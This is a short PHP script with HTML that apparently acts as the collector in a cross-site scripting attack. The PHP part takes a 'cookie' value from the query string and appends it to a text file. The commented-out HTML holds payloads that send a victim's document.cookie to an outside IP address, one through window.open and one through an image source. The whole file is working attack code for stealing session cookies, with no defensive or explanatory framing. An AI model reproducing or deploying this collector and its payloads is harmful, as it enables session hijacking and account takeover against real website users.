<?php
/**
 * Created by PhpStorm.
 * User: Junay
 * Date: 2017/7/21
 * Time: 23:21
 */
    $cook = isset($_GET['cookie'])?$_GET['cookie']:null;
  //  echo "你的COOKIE: ".$cook." 已储存<br>";
    $file = fopen('upload/ssss.txt','a+') or die('Unable to open file');
    fwrite($file,$cook);
    fclose($file);
?>
<html>
<head></head>
<body>

<!--    <script>window.open("http://202.192.32.64/phpstudy/xss.php?cookie="+document.cookie)</script>-->
<!--<img id="change" src="x">-->
<!--<script>-->
<!--    element = document.getElementById('change');-->
<!--    var cook = document.cookie;-->
<!--    element.src="http://202.192.32.64/phpstudy/xss.php?cookie="+cook;-->
<!--</script>-->


</body>
</html>